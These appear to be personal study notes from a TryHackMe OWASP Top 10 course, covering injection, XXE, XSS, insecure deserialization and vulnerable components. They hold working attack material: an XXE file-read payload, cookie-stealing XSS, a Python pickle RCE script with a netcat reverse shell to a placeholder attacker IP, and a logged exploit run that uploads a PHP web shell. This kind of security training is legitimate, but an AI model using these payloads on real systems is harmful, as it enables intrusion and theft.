OWASP TOP 10

SQL injection and command injection
input is passed to SQL queries or system commands
can be prevented using allow list(compared to a list to see if safe or not) and stripping input (dangerous charecters removed)

passthru() in php 
it executes what gets entered into the input then passing the output directly back to the browser.


cut -d : -f 1 /etc/passwd
to get the users from the /etc/passwd file

w    (or)  who
to list currently logged in users

users
to display the users

lastlog
recent login info

lsb_release -a
to check ubuntu version

MOTD - message of the day (used to send a common message to all the users) (welcome message)
/etc/motd is not a script but a text file. contents are shown before the first prompt of a login session.
locate motd
cat  /etc/update-motd.d/00-header

Create a file in /etc/profile.d called greeting.sh
If you don't want to do this for every user, add it to ~/.profile or ~/.bash_profile


Broken authentication
A user would enter login credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. 
A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions. 

re-registration of an existing user.
say there is an existing user with the name admin and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin"(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user admin.


Sensitive Data Exposure
Databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer.
The most common (and simplest) format of flat-file database is an sqlite database. Can be interacted with sqlite3 client.

file example.db      (shows details about the file)
sqlite3 example.db
sqlite> .tables          (to see the tables in the DB)
sqlite> PRAGMA table_info(customers);             (to see the table information)
sqlite> SELECT * FROM customers;

Password hash cracking
online tool: Crackstation     (to crack weak password hashes like MD5)
Crackstation works using a massive wordlist. If the password is not in the wordlist then Crackstation will not be able to break the hash.


Challenge:
given a webapp's address. developer has left a note indicating that there is sensitive data in a specific directory. Hint: view source code of login page
Found that '/assets' was the directory.
went to 'website_link/assets'
found webapp.db, downloaded it and opened it using sqlite3 after seeing the file type.
sqlite> .tables          (to see the tables in the DB)
sqlite> PRAGMA table_info(useres);             (to see the table information)
sqlite> SELECT * FROM users;
found admin's hashed password. cracked it using crackstation. logged in as admin and found the flag


XML External Entity 
An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.
There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

XML
defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data. 
XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
 
Syntax
Every XML document mostly starts with what is known as XML Prolog (specifies version and encoding)  (not compulsory, but a good practice)
<?xml version="1.0" encoding="UTF-8"?>

Every XML document must contain a `ROOT` element. For example:

<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>

<mail> is the ROOT element of that document and <to>, <from>, <subject>, <text> are the children elements. If the XML document doesn't have any root element then it would be consideredwrong or invalid XML doc.

<text category = "message">You need to learn about XXE</text>
category is the attribute name and message is the attribute value.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.
example a file named note.dtd with the following content:
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>

!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ELEMENT from - Defines the from element to be of type "#PCDATA"
!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
!ELEMENT body - Defines the body element to be of type "#PCDATA"

NOTE: #PCDATA means parseable character data.
!element to define a new element
!doctype to define a ROOT element
!entity to define a new entity

XXE payload and see how they are working:
1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.
2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.
If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

https://hackingprofessional.github.io/Security/How-to-hack-a-website-with-XML-External-Entity-Injection/



Broken Access Control
broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.
sccenario: change parameters in SQL call, force browses to target URLs

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.


Security Misconfiguration 
occur when security could have been configured properly but was not.
Security misconfigurations include:

Poorly configured permissions on cloud services, like S3 buckets
Having unnecessary features enabled, like services, pages, accounts or privileges
Default accounts with unchanged passwords
Error messages that are overly detailed and allow an attacker to find out more about the system
Not using HTTP security headers, or revealing too much detail in the Server: HTTP header

find default credentials by searching for "pensive notes default credentials " on google. open the first github link to find the username and password


Cross-site Scripting 
type of injection, can execute malicious scripts and have it execute on a victim’s machine.
A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. 
There are three main types of cross-site scripting:
Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.

Common payloads types used:
Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
http://www.xss-payloads.com/  is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.

go to the website, choose "reflected XSS" and craft a pop up message.
<script>alert("Hello")</script>

craft a pop up displaying machines IP address
<script>alert(window.location.hostname)</script>

go to "stored XSS" after creating an account.
insert own html in the comment section
<h>hello</h>

create a pop up with document cookies
<script>alert(document.cookies)</script>
or go to console in inspect element and execute document.cookies

DOM XSS
Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
HTML DOM querySelector() - The querySelector() method only returns the first element that matches the specified selectors
CSS Selector — #thm-title Selects the element with id=”thm-title”
HTML DOM Text Content Property — If you set the textContent property, any child nodes are removed and replaced by a single Text node containing the specified string


Insecure Deserialization 
vulnerability which occurs when untrusted data is used to abuse the logic of an application
replacing data processed by an application with malicious code; allowing anything from DoS to RCE that the attacker can use
Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.

the apache software foundation developed tomcat application
DOS crashes services, can be done using insecure deserialisation

Insecure Deserialization - Objects 
A prominent element of object-oriented programming (OOP), objects are made up of two things:
- State
- Behaviour

Insecure Deserialization - Deserialization 
Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.
Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.


Insecure Deserialization - Cookies 
"Expiry" timer is set when the cookie is created.
cookie attributes:
Cookie Name , Cookie Value , Secure Only (cookie only set over HTTPS) , Expiry (timestamp) , Path (cookie sent only if specified URL is within request)
creating cookies: in python's flask
dateTime=datetime.now()
timestamp=str(dateTime)
resp.set_cookie("registrationTimestamp", timestamp)

Insecure Deserialization - Cookies Practical 
cookies are both plaintext encoded and base64 encoded.decode to find the flag
change the "Value" column of "userType" to "admin".got to website/admin to find the flag

Insecure Deserialization - Code Execution 
cookie={"replaceme":payload}
pickle_payload=pickle.dumps(cookie)
encodedPayloadCookie=base64.b64encode(pickle_payload)
resp=make_response(redirect("/myprofile"))
resp.set_cookie("encodedPayload", encodedPayloadCookie)

how the cookie is retrieved and then deserialized via pickle.loads
cookie=request.cookies.get("encodedPayload")
cookie=pickle.loads(base64.b64decode(cookie))

This vulnerability exploits Python Pickle. We essentially have free reign to execute whatever we like such as a reverse shell.
Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed.
First, we need to set up a netcat listener on our Kali.
nc -lvnp 4444    (command)
Once this is complete, copy-and-paste the source code from this Github page to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP. This can be obtained via the Access page.
https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3

import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))

1. Create a python file to paste into, I have used "rce.py" for these examples:
2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page
3. Execute "rce.py" via python3 rce.py
4. Note the output of the command
5.Copy and paste everything in-between the two speech marks ('DATA')
6. Paste this into the "encodedPayload" cookie in your browser:
7. Ensure our netcat listener is still running:
8. Refresh the page. It will hang, refer back to your netcat listener:
If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!

find / | grep flag.txt    (to find the flag)


Components With Known Vulnerabilities - Intro 
wpscan tool - for wordpress

Components With Known Vulnerabilities - Exploit
this server is using the default page for the nostromo web server. 
Nostromo 1.9.6
use exploit-db to try and find an exploit for this particular version.
download exploit script
run it
most scripts will just tell you what arguments you need to provide(no need to read the whole code)

Components With Known Vulnerabilities - Lab
was an online CSE bookstore made using PHP with MYSQL
checked source code for version..no luck
found that it was from http://projectworlds.in/
was showing Admin Login 2017 on the page, so searched that, found some exploits for this in EDB but wasnt RCE, it was SQLi
looked at the hint given by THM, it says "You know its a bookstore application, you should check for recent unauthenticated bookstore app rce's."
seacrhed it and found an RCE on EDB. downloaded it and ran it using the following command because the note was : Note: When you find the exploit script, put all of your input in quotes, for example "id"
python3 47887.py 10.10.2.86 80 "id"
it said : 
usage: 47887.py [-h] url
47887.py: error: unrecognized arguments: 80 id

so ran :
python3 47887.py http://10.10.2.86

output was:
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.2.86/bootstrap/img/JDb1FN4Uzw.php
> Example command usage: http://10.10.2.86/bootstrap/img/JDb1FN4Uzw.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ 


RCE $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

task was to get how many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer) :

RCE $ wc -c /etc/passwd
1611 /etc/passwd



Insufficient Logging and Monitoring 
The bigger impacts: regulatory damage (fines or more severe actions), risk of further attacks

The information stored in logs should include:
HTTP status codes
Time Stamps
Usernames
API endpoints/page locations
IP addresses

Common examples of suspicious activity includes:
multiple unauthorised attempts for a particular action 
requests from anomalous IP addresses or locations
use of automated tools : e.g. using the value of User-Agent headers or the speed of requests
common payloads

Log file was given, had to observe for for common actions in a short sequence of time (brute force attack to find admin credentials was seen)

